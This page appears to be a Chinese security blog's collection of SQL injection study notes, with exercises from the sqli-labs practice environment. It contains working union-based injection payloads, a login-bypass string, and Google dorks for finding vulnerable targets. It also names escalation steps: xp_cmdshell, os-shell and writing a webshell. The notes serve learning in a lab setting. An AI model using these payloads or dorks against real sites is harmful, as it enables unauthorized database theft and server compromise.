          <a href="/2022/03/19/SQL/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">sql手工注入方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-19 17:30:51 / 修改时间：17:36:00" itemprop="dateCreated datePublished" datetime="2022-03-19T17:30:51+08:00">2022-03-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="Mysql内置库："><a href="#Mysql内置库：" class="headerlink" title="Mysql内置库："></a>Mysql内置库：</h3><p>mysql：保存现有账户信息，权限信息，存储过程，event，时区等信息</p>
<p>sys：包含了一系列的存储过程，自定义函数以及视图来帮助我们快速的了解系统的元数据信息（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</p>
<p>performance_schema：用于收集数据库服务器性能参数</p>
<p>information_schema:它提供了访问数据库元数据的方式，其中保存着关于Mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的类型与访问权限等</p>
<p>核心原理：</p>
<p>Mysql内置的information_schema库，他功能强大，是我们进行注入的基石，通过information_schema可以窥视整个数据库的运行情况和数据信息</p>
<h3 id="查询数据的核心语法："><a href="#查询数据的核心语法：" class="headerlink" title="查询数据的核心语法："></a>查询数据的核心语法：</h3><p><strong>查库：select schema_name from informaiton_schema.schemata</strong></p>
<p><strong>查表：select table_name from information_schema.tables where table_schema=库名</strong></p>
<p><strong>查列：select column_name from information_schema.columns where</strong></p>
<p><strong>table_name=表名</strong></p>
<p><strong>查数据：select 列名 from 库名.表名</strong></p>
<p>若某个数据不能使用单引号包括，可以用hex转换</p>
<p>tips：</p>
<ol>
<li>所有类型的注入都是基于查库查表查列</li>
<li>如果数据太多导致无法返回查询结果，查询的场景：可利用limit限定返回的数量和位置，依次查询。回显数据的场景：<em>concat</em>链接多个数据成为一条返回结果</li>
<li>在一些场景，想要快速获取数据，需借助工具如bp<h2 id="练习：sqli-lab-less1"><a href="#练习：sqli-lab-less1" class="headerlink" title="练习：sqli-lab less1"></a>练习：sqli-lab less1</h2></li>
</ol>
<p>id=1时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
<p>可得到用户名和密码回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2&#x27;时</span><br><span class="line">select * from user where id=&#x27;2&#x27; &#x27;limit 0,1</span><br></pre></td></tr></table></figure>
<p>回显语法错误，进行简单的逻辑判断<br>id=2’ and ‘1’ =’1 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selec * from user where id =&#x27;2&#x27; and &#x27;1&#x27; = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<p>回显正常，得到id=2的用户名和密码，由此可知这一题存在sql注入<br>利用上述提到的知识进行注入先用union判断字段长度</p>
<p>id=2’ order by 1– +</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;2&#x27; order by 1-- + &#x27;</span><br></pre></td></tr></table></figure>
<p>回显正常，说明存在一个字段，依次增加字段数，可知道有三个字段<br>id=2’ union select 1,2,3–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;2&#x27; union select 1,2,3 --+&#x27;</span><br></pre></td></tr></table></figure>
<p>回显正常，确实存在三个字段，接着因为2不能返回我们想要的结果，切换为不存在的id值<br>id=-2’ union select 1,2,(select schema_name from information_schema.schemata)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;-2&#x27; union select 1,2,(select schema_name from informaiton_schema.schemata)--+&#x27;</span><br></pre></td></tr></table></figure>
<p>这次返回提示我们返回的数据过多，我们使用limit对数据进行依次查看或者group_concat将数据集合查看<br>id=-2’ union select 1,2,(select schema_name from information_schema.schemata limit 0,1)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;-2&#x27; union select 1,2,(select schema_name from informaiton_schema.schemata limit 0,1)--+&#x27;</span><br></pre></td></tr></table></figure>
<p>获得了库名，继续获得表名<br>id=-2’ union select 1,2,(select table_name from information_schema.tables where table_schema=’库名’ limit 0,1)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;-2&#x27; union select 1,2,(select table_name from information_schema.tables where table_schema=&#x27;库名&#x27; limit 0,1)--+&#x27;</span><br></pre></td></tr></table></figure>
<p>获得了表名，继续获得列名<br>id=-2’ union select 1,2,(select column_name from information_schema.columns where table_name=’表名’ limit 0,1)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;-2&#x27; union select 1,2,(select column_name from information_schema.columns where table_name=&#x27;列名&#x27; limit 0,1)--+&#x27;</span><br></pre></td></tr></table></figure>
<p>获得了表名和列名，就可以直接查询数据了<br>id=-2’ union select 1,2,(select username,password from 库名.表名)–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;-2&#x27; union select 1,2,(select username,password from 库名.表名)--+&#x27;</span><br></pre></td></tr></table></figure>
<p>如果返回数据过多，依旧使用上述两种方法，如果查询出来过多不便辨认，可以使用concat_ws(‘~’,username,password)进行分割<br>也有一些比较简单的语句</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select user()</span><br><span class="line">select database()</span><br><span class="line">select load_file(&#x27;文件目录&#x27;)读本地文件或者系统文件</span><br><span class="line">select &#x27;test&#x27; into outfile &#x27;文件目录&#x27; 写文件（root权限）</span><br></pre></td></tr></table></figure>

<h2 id="Union联合查询"><a href="#Union联合查询" class="headerlink" title="Union联合查询"></a>Union联合查询</h2><h3 id="union操作符："><a href="#union操作符：" class="headerlink" title="union操作符："></a>union操作符：</h3><p>union操作符用于合并两个或多个select语句的结果集。</p>
<p>注意，union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时每条select语句中的列顺序必须相同</p>
<p>默认情况，union操作符选取不同的值，如果允许重复的值，请使用union all</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select columns_name(s) from table_name1 union select column_name(s) from table_name2</span><br><span class="line">select columns_name(s) from table_name1 union all select column_name(s) from table_name2</span><br></pre></td></tr></table></figure>

<h3 id="union注入应用场景："><a href="#union注入应用场景：" class="headerlink" title="union注入应用场景："></a>union注入应用场景：</h3><ol>
<li>只有最后一个select子句允许有Order by;</li>
<li>只要最后一个select子句允许有limit</li>
<li>只要Union链接的几个查询的字段数一样且列的数据类型转换没有问题。就可以查询出结果</li>
<li>注入点页面有回显<br>例子：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by id union select  1,2,3;</span><br><span class="line">select * from users limit 0,1 union select 1,2,3</span><br></pre></td></tr></table></figure>

<h3 id="union注入过程-sqli-lab-less4学习"><a href="#union注入过程-sqli-lab-less4学习" class="headerlink" title="union注入过程: sqli=lab less4学习"></a>union注入过程: sqli=lab less4学习</h3><p>orderby 猜出来的列数超过数据库表中的列数，报错并不能返回数据</p>
<ol>
<li>orderby确定列数（二分法）</li>
<li>观察回显，选取数据位置，进行下一步注入</li>
<li>读库信息</li>
<li>读表信息</li>
<li>读字段</li>
<li>读数据<br>大体步骤跟上文差不多这里给出例子：</li>
</ol>
<p>id=-1’ union select 1,2,(select database())–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;-1&#x27; union select 1,2,(select database())--+&#x27;</span><br></pre></td></tr></table></figure>
<p>接着按照手工注入的步骤继续查询我们想要的信息，如果信息过多就采取limit或者group_concat，要采取间隔就用concat_ws，这样会更好查看一点</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/SQL/Sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/19/SQL/Sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" class="post-title-link" itemprop="url">sql注入流程</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-19 14:15:12 / 修改时间：17:35:47" itemprop="dateCreated datePublished" datetime="2022-03-19T14:15:12+08:00">2022-03-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="寻找注入点："><a href="#寻找注入点：" class="headerlink" title="寻找注入点："></a>寻找注入点：</h2><ol>
<li>目标搜集：</li>
</ol>
<ul>
<li><p>无特定目标：</p>
<pre><code> inurl:php?id=
</code></pre>
</li>
<li><p>有特定目标：</p>
<pre><code>  inurl:php?id=site:target.com
</code></pre>
</li>
<li><p>工具爬取:</p>
<pre><code> spider,对搜索引擎和目标网站的链接进行爬取
</code></pre>
</li>
</ul>
<p><strong>工具：googlehack语法</strong></p>
<h2 id="注入识别："><a href="#注入识别：" class="headerlink" title="注入识别："></a><strong>注入识别：</strong></h2><ul>
<li><p>手工简单识别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">and 1=1 /and 1=2</span><br><span class="line">and &#x27;1&#x27; = &#x27;1 /and &#x27;1&#x27;=&#x27;2</span><br><span class="line">and 1 like 1 /and 1 like  2 </span><br></pre></td></tr></table></figure></li>
<li><p>工具识别：</p>
<pre><code>sqlmap - m filename(file中保存检测目标）

sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试）
</code></pre>
</li>
<li><p>高级识别：</p>
</li>
</ul>
<ol>
<li>拓展识别广度和深度：<br>sqlmap –level 增加测试级别，对header中相关参数也进行测试<pre><code>sqlmap -r filename （filename中为网站请求数据)
</code></pre>
</li>
</ol>
<p>2.利用工具提高识别效率：</p>
<pre><code> Burpsuite + sqlmap

 burpsuite拦截所有浏览器访问提交的数据

 burpsuite拓展插件，直接调用sqlmap进行测试
</code></pre>
<p>Tips:</p>
<p>可以在参数后键入”*”来确定想要测试的参数</p>
<p>可能出现注入的点：新闻，登陆，搜索，留言</p>
<p>站在开发的角度去寻找</p>
<h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><h3 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h3><ol>
<li>数据库类型</li>
<li>数据库版本</li>
<li>数据库用户</li>
<li>数据库权限<br>例子：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check the manual that corresponds to your Mysql server for the right synatx 或者 Microsoft JET Database Engine 错误</span><br></pre></td></tr></table></figure>
<p>函数：version().@@version<br>@@version v$version</p>
<p>user(),SYSTEM_USER</p>
<p>super_priv IS_SRVROLEMEMBER</p>
<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="获取数据："><a href="#获取数据：" class="headerlink" title="获取数据："></a>获取数据：</h3><ol>
<li>获取库信息</li>
<li>获取表信息</li>
<li>获取列信息</li>
<li>获取数据<br>方法：语句查询和暴力破解</li>
</ol>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h3><ol>
<li>执行命令：sqlserver sa权限 xp.cmdshell或–os-shell</li>
<li>读文件 ： 读中间件配置文件，读数据库配置文件</li>
<li>写文件 ： 写webshell到网站目录</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/SQL/sql%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/18/SQL/sql%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">sql基础操作练习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-18 21:23:12 / 修改时间：21:23:29" itemprop="dateCreated datePublished" datetime="2022-03-18T21:23:12+08:00">2022-03-18</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>select * from msg where id &lt;&gt;61 and id&lt;&gt;64 order by id desc limit  1,3</p>
<p>select * from msg where id &lt;&gt;61 and id&lt;&gt;64 order by id desc limit  1,3</p>
<p>use runoob</p>
<p>set names utf8</p>
<p>select * from websites</p>
<p>大写不敏感,且在语句末端使用分号</p>
<p>select update delete </p>
<p>insert into create database</p>
<p>alter database</p>
<p>create table</p>
<p>alter table</p>
<p>drop table</p>
<p>create index</p>
<p>drop index</p>
<p>select column_name,column_name from table_name;</p>
<p>select * from table_name;</p>
<p>select name,country from websites;</p>
<p>select distinct column_name,column_name from table_name;</p>
<p>select column_name,column_name from table_name where column_name operator value;</p>
<p>select * from websites where country=’CN’;</p>
<p>select * from websites where id = 1;</p>
<p>and 如果第一个条件和第二个条件都成立，则AND运算符显示一条记录</p>
<p>or 如果第一个条件和第二个条件只要有一个成立，则or运算符显示一条记录</p>
<p>（基于一个以上的条件对记录过滤）</p>
<p>select * from  websites where country=’CN’ and alexa &gt; 50;</p>
<p>select * from websites where  country=’USA’ or country=’CN’;</p>
<p>select * from websites where  alexa&gt;5 and (country=’CN’ or country=’USA’);</p>
<p>select column_name,column_name from table_name order by column_name,column_name asc|desc</p>
<p>insert into table_name values (1,2,3,4);</p>
<p>insert into table_name (column_name1,column_name2,column_name3) values (value1,value2,value3);</p>
<p>insert into websites (name,url,alexa,country) values(1,2,3,4);</p>
<p>insert into websites(name,url,alexa,country) values(1,2,3,4);</p>
<p>update table_name set column1=value1,column2=value2 where some_column=some_value;</p>
<p>update websites set alexa=’5000’,country=’USA’ where name = ‘菜鸟教程’;</p>
<p>delete from table_name where some_column=some_value;</p>
<p>delete from websites where name=’facebook’ and country=’USA’;</p>
<p>delete from table_name;delete * from table_name;</p>
<p>select column_name(s) from table_name limit number;</p>
<p>select * from persons limit 5;</p>
<p>select * from websites limit 2;</p>
<p>select column_name(s) from table_name where column_name like pattern;</p>
<p>select * from websites;</p>
<p>select * from websites where name like ‘G%’;%为通配符</p>
<p>%替代0个或多个字符</p>
<p>_替代一个字符</p>
<p>[charlist]字符列中的任何一个单一字符</p>
<p>[^charlist]不在字符列中的任何单一字符</p>
<p>select * from websites where url like ‘https%’;</p>
<p>select * from websites where url like ‘_oogle’;</p>
<p>select column_name(s) from table_name where column_name in (value1,value2);</p>
<p>select column_name(s) from table_name where column_name between value1 and value2;</p>
<p>select column_name(s) from table_name where column_name not between value1 and value2;</p>
<p>select * from websites where (alexa between 1 and 20) and country not in (‘usa’,’ind’);</p>
<p>select column_name(s) from table1 union select column_name(s) from table2;</p>
<p>select column_name(s) from table1 union all select column_name(s) from table2;</p>
<p>select * from websites;</p>
<p>select * from apps;</p>
<p>select country from websites union select country from apps order by country;</p>
<p>select country,name from websites where country=’CN’ union all select country,app_name from apps where country=’CN’ order by country;</p>
<p>drop table table_name;</p>
<p>drop database database_name;</p>
<p>truncate table table_name;</p>
<p>alter table table_name;</p>
<p>add column_name datatype;</p>
<p>modify column column_name datatype;</p>
<p>mysqli_connect(host,username,password,dbname,port,socket);</p>
<p>mysqli_close(mysqli &amp;link);</p>
<?php

$dbhost='localhost';

$dbuser='root';

$dbpass='123456';

$conn=mysqli_connect($dbhost,$dbuser,$dbpass);

if(!$conn){

die('could not connect:'.mysqli_error());

}

echo'数据库连接成功！';

mysqli_close($conn);

?>

<p>select system_user();</p>
<p>select user();</p>
<p>select current_user();</p>
<p>select session_user();</p>
<p>select database();</p>
<p>use security;</p>
<p>select database();</p>
<p>select version();</p>
<p>select @@version;</p>
<p>select @@datadir;</p>
<p>select @@basedir;</p>
<p>select @@version_compile_os;</p>
<p>select * from users;</p>
<p>select count(*) from users;</p>
<p>select concat(1,2);</p>
<p>select concat(username,password) from users;</p>
<p>select concat_ws(“:”username,password) from users;</p>
<p>select username from users;</p>
<p>select group_concat(username) from users;</p>
<p>select ‘mysql’ into outfile ‘/tmp/mysql’;</p>
<p>select load_file(‘/tmp/mysql’);</p>
<p>select ascii(‘a’);</p>
<p>select ord(‘bc’);</p>
<p>select mid(‘mysql’,1,1);</p>
<p>select substr(‘mysql’,1,1);</p>
<p>select  length(‘mysql’);</p>
<p>select left(‘mysql’,1);</p>
<p>select floor(5.1);</p>
<p>select rand();</p>
<p>select sleep(2);</p>
<p>select IF(1&lt;2,2,3);</p>
<p>select char(97);</p>
<p>select strcmp(‘a’,’b’);</p>
<p>select ifnull(1,2);</p>
<p>select ifnull(Null,2);</p>
<p>select exp(1);</p>
<p>and 1=2 union select 1,2,3–;</p>
<p>select user() regexp ‘^ro’;</p>
<p>ascii(substr((select user()),1,1))=114;</p>
<p>if(ascii((select user()),1,1))=114,0,sleep(4));</p>
<p>(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9);</p>
<p>updatexml(1,concat(0x7e,(select,@@version),0x7e),1);</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/SQL/SQL%20%E6%B3%A8%E5%85%A5%EF%BC%880%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/18/SQL/SQL%20%E6%B3%A8%E5%85%A5%EF%BC%880%EF%BC%89/" class="post-title-link" itemprop="url">sql注入(0)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-03-18 21:19:12 / 修改时间：21:20:05" itemprop="dateCreated datePublished" datetime="2022-03-18T21:19:12+08:00">2022-03-18</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="前置知识：sql基础语法"><a href="#前置知识：sql基础语法" class="headerlink" title="前置知识：sql基础语法"></a>前置知识：sql基础语法</h3><h3 id="环境：mysql，Sqli-lab，phpstudy"><a href="#环境：mysql，Sqli-lab，phpstudy" class="headerlink" title="环境：mysql，Sqli-lab，phpstudy"></a>环境：mysql，Sqli-lab，phpstudy</h3><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>编写代码时没有对用户的输入数据或者是页面中所携带的信息进行必要的合法性判断，攻击者利用这个机会提交一段数据库查询代码，根据程序返回的结构就可以获得一些数据库信息</p>
<p>SQL注入是一种将恶意的sql代码插入或添加到应用的输入参数的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙地构造SQL语句，对DBMS的内容进行直接检索或修改</p>
<p> <strong>灵活的SQL查询语句</strong><strong>+<strong><strong>用户输入的数据带入了SQL语句</strong></strong>=<strong><strong>用户直接操作数据库</strong></strong>-&gt;SQL注入</strong></p>
<p><strong>例如：</strong></p>
<p>正常查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br><span class="line">select id from jobs where id = 1;</span><br><span class="line">select id from jobs where id = 1 union select version();</span><br><span class="line">select id,location from jobs where id = 1 union select 1,version()；</span><br></pre></td></tr></table></figure>

<p>用户输入可控，代码对用户输入，带入了SQL语句，产生了SQL注入漏洞：</p>
<p><a target="_blank" rel="noopener" href="http://test.com/index.php?id=">http://test.com/index.php?id=</a>1 union select 1,version()#</p>
<p>前者是正常输入，后者是用户输入可自主控制</p>
<p>代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27; limit 0,1&quot;</span><br></pre></td></tr></table></figure>
<p>具体输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,location from jobs where id = 1</span><br></pre></td></tr></table></figure>
<p>返回id为1的location</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,location from jobs where id = 1 union select 1,version()#</span><br></pre></td></tr></table></figure>
<p>返回id为1的location和数据库版本<br>如果是想查询id和其他数据的信息，比如说查id和版本信息时</p>
<p>正常查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1  union select 1,2,version()#</span><br></pre></td></tr></table></figure>
<p>上面是正常查询的语句，但如果要代入代码即上面贴出的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27; limit 0,1&quot;</span><br></pre></td></tr></table></figure>
<p>我们则要考虑闭合单引号，构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,version()# </span><br></pre></td></tr></table></figure>
<p>PS:#为sql中的注释，即后面的语句全都忽略不执行<br>把payload代入代码就是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where id=&#x27;1&#x27; union select 1,2,version()#&#x27;  limit 0,1&quot;</span><br></pre></td></tr></table></figure>
<p>这里可以很清晰的看见1’闭合了前面的select后面的union联合查询执行查询版本信息，#把后面的给注释忽略不执行,这就是比较典型的一个sql注入语句<br>但是这里所有我们自主输入的数据都是正确可执行的，比如id=1’，闭合后就是id=’1’就是查询1，执行后显示的就是id为1的数据，后面union查询的不会显示，所以需要把第一个数据改为一个错误或者说是不存在的比如说是-1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,version()# </span><br></pre></td></tr></table></figure>
<p>再把上面的代入$sql这里，就能显示出版本的信息。</p>
<h1 id="Mysql常用函数及逻辑运算："><a href="#Mysql常用函数及逻辑运算：" class="headerlink" title="Mysql常用函数及逻辑运算："></a>Mysql常用函数及逻辑运算：</h1><p>PS：内置函数推荐去官方文档去查看或者是菜鸟教程之类的</p>
<h3 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h3><p>system_user():系统用户名</p>
<p>user():用户名</p>
<p>current_user():当前用户名</p>
<p>session_user():连接数据库的用户名</p>
<p>database():数据库名</p>
<p>version():数据库版本</p>
<p>@@datadir:数据库路径</p>
<p>@@basedir:数据库安装路径</p>
<p>@@version_compile_os:数据库安装路径</p>
<p>count():返回执行结果数量</p>
<p>concat():没有分隔符地连接字符串</p>
<p>concat_ws():含有分隔符地连接字符串</p>
<p>group_concat():连接一个组的所有字符串，并以逗号分隔每一条数据</p>
<p>load_file():读取本地文件</p>
<p>into_outfile:写文件</p>
<p>ascii():字符串的ASCII代码值</p>
<p>ord():返回字符串第一个字符的ASCII值</p>
<p>mid():返回一个字符串的一部分</p>
<p>substr():返回一个字符串的一部分</p>
<p>length():返回字符串的长度</p>
<p>left():返回字符串的最左面几个字符</p>
<p>floor():返回小于或等于x的最大整数</p>
<p>rand():返回0和1之间的一个随机数</p>
<p>extractvalue():第一个参数：XML_document是string格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string(Xpath格式的字符串）</p>
<p>作用:从目标XML中返回包含所查询值的字符串</p>
<p>updatexml():第一个参数：XML_document是string格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数:Xpath_string(Xpath格式的字符串）</p>
<p>第三个参数：new_value,String格式，替换查找到的符合条件的数据</p>
<p>作用:改变文档中符合条件的节点的值</p>
<p>sleep():让此语句运行N秒钟</p>
<p>if():&gt;select if(1&gt;2,2,3);</p>
<pre><code>_&gt;3
</code></pre>
<p>char():返回整数Ascii代码字符组成的字符串</p>
<p>STRCMP()：比较字符串内容</p>
<p>IFNULL():假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2</p>
<p>exp():返回e的x次方</p>
<p>算术运算符：</p>
<p>+:加法运算   -: 减法运算  *：乘法运算  /:除法运算 %:求余运算 </p>
<p>DIV:除法运算，同”/“  MOD:求余运算，同“%”</p>
<p>比较运算符：</p>
<blockquote>
<p>:大于  &lt;:小于 =：等于  &gt;=:大于等于  &lt;=:小于等于   !=或&lt;&gt;:不等于  </p>
</blockquote>
<p>IS NULL:为空  IS NOT NULL:不为空  </p>
<p>BETWEEN AND:在…之间  IN:包含</p>
<p>NOT IN:不包含   LIKE：模式匹配</p>
<p>NOT LIKE:模式匹配  REGEXP:正则匹配式</p>
<p>逻辑运算符：</p>
<p>&amp;&amp;或AND：与    !或NOT:非  ||或OR：或  XOR:异或</p>
<p>AND&lt;–&gt;OR:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and 1=1</span><br></pre></td></tr></table></figure>
<p>前者为true，后者也是true，总体为true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 or 1 = 2</span><br></pre></td></tr></table></figure>
<p>前者为true，后者为false，总体为true<br> 以上为AND和OR的区别</p>
<p>登陆处的SQL语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &#x27;admin&#x27; and pwd = &#x27;pass&#x27; ;</span><br></pre></td></tr></table></figure>
<p>万能密码：‘or ‘1’ = ‘1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &#x27;  &#x27;or &#x27;1&#x27; = &#x27;1  &#x27; and pwd = &#x27; &#x27; or &#x27;1&#x27; = &#x27;1 &#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username = &quot; or &#x27;1&#x27; = &#x27;1&#x27; and pwd = &quot; or &#x27;1&#x27; = &#x27;1&#x27;</span><br></pre></td></tr></table></figure>
